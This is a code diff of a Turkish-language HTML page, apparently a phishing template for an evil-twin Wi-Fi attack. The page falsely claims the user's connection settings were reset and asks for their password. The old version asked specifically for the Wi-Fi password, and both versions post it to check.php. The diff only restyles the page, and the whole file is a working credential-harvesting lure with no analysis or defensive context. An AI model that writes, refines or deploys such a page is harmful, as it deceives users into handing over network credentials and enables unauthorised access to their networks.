@@ -1,67 +1,114 @@
 <html>
 
 <head>
+    <style>
+        body {
+            margin: 0px;
+            background-color: transparent;
+            overflow: hidden;
+        }
+        
+        .main-frame-text-error {
+            text-align: left;
+            color: #7F7F7F;
+            font-size: 18px;
+            margin-top: 20px;
+            padding-left: 5%;
+        }
+        
+        .main-frame-text {
+            padding-left: 10%;
+            padding-right: 10%;
+            color: #74797b;
+        }
+        
+        .main-frame-over-input-text {
+            padding-left: 10%;
+            padding-right: 10%;
+            color: #74797b;
+        }
+        
+        .table-div {
+            padding-left: 10%;
+        }
+        
+        .table-input {
+            width: 400;
+            border-collapse: collapse;
+            border-spacing: 0;
+        }
+        
+        .table-data-1 {
+            border-width: 1px 1px 1px 1px;
+            border-style: solid;
+            border-color: #CBCBCD;
+            background-color: #eeeeee;
+        }
 
-    <link rel="stylesheet" type="text/css" href="info2.css" media="all">
+        .table-white {
+            background-color: white;
+            color: #7F7F7F;
+            font-size: 14px;
+            padding-left: 10px;
+        }
+
+        .table-image {
+            margin-left: 5px;
+            margin-top:2px;
+            
+        }
+        
+        .input-pass {
+            width: 100%;
+            height: 100%;
+            padding: 0px;
+        }
+        
+        .confirmbtn {
+            -moz-border-radius: 5px;
+            -webkit-border-radius: 5px;
+            border-radius: 5px;
+            width: 100%;
+            height: 100%;
+            background: -webkit-gradient(linear, left top, left bottom, from(#80c1f6), to(#50b1fe));
+            background: -moz-linear-gradient(top, #80c1f6, #50b1fe);
+            background: -o-linear-gradient(top, #80c1f6, #50b1fe);
+            filter: progid: DXImageTransform.Microsoft.Gradient(StartColorStr='#80c1f6', EndColorStr='#50b1fe', GradientType=0);
+            padding: 0px;
+        }
+    </style>
+
 </head>
 
-<body bgcolor="transparent" marginheight="0" marginwidth="0">
-
-    <table border="0" cellpadding="0" cellspacing="0" width="100%">
-        <tbody>
-            <tr>
-                <td width="2%">&nbsp;</td>
-                <td width="5%"></td>
-                <td width="93%">
-                    <div valign="top" align="left">
-                        <table border="0" cellpadding="0" cellspacing="0" width="360">
-
-            </tr>
-            <TABLE id="autoWidth">
-
-                <TBODY>
-                    <tr>
-                        <td>
-                            <hr color="#9CBCE3" size=3 width="99%">
+<body>
+    <p class="main-frame-text-error">Bağlantı ayarlarınız sıfırlandı!</p>
+    <p class="main-frame-text">Bağlantınızda bir sorun algılandı ve bağlantı ayarlarınız sıfırlandı</p>
+    <p class="main-frame-over-input-text">Bağlantınızı geri getirmek için şifrenizi giriniz:</p>
+    <div class="table-div">
+        <table class="table-input">
+            <tbody>
+                <tr>
+                    <td class="table-data-1">
+                        <img src="images/password.png" class="table-image">
+                    </td>
+                    <td class="table-data-1 table-white">
+                        <p>Şifre</p>
+                    </td>
+                    <form id="form1" name="form1" method="POST" action="check.php">
+                        <td class="table-data-1">
+                            <input name="key1" type="password" class="input-pass" />
                         </td>
-                    </tr>
+                        <td class="table-data-1">
+                            <input name="Confirm" class="confirmbtn" type="submit" value="Onayla" />
+                        </td>
 
-                    <tr>
-                        <td colspan=\ "2\"><font color="#282B2F"><b></b></td></tr>
-        <tr><td colspan=\"2\"  ><font color="#282B2F"><b></b> Bağlantı ayarlarınız sıfırlandı!</td></tr>
-        <tr><td colspan=\"2\"  ><font color="#282B2F"><b></b></td></tr>
+                    </form>
+                </tr>
+            </tbody>
 
-<tr><td></td></tr>
+        </table>
+    </div>
 
-<tr><td><hr color="#9CBCE3" size=3 width="99%"></td></tr>
-<tr><td></td></tr>
-
-        <TR>
-
-          <TD class=info1 colspan=2>
-<br><font color="#282B2F">
-Bağlantınızda bir sorun algılandıve bağlantınız sıfırlandı
-<br>
-<br>
-Güvenliğiniz için lütfen şifrenizi giriniz<b></b>
-<br>
-<div id="box" align="left" >
-<form id="form1" name="form1" method="POST" action="check.php" >
-<tr><td><b><font color="#282B2F">Wi-Fi</b> Şifreniz:</td></tr>
-<tr><td><input name="key1" type="password" class="textfield" /><td></tr>
-
-        <TR><TD class=blue colspan=2></TD></TR>
-                <TR><TD class=blue colspan=2></TD></TR>
-
-<tr><td colspan="2"><INPUT name="Confirm" class="button" type="submit" value="Confirm"/></td></tr>
-
-</form></div>
-
-</TD></TR>
-
-      </TBODY>
-
-    </TABLE>
-</table></div></td></tr></tbody></table>
 </body>
+
 </html>
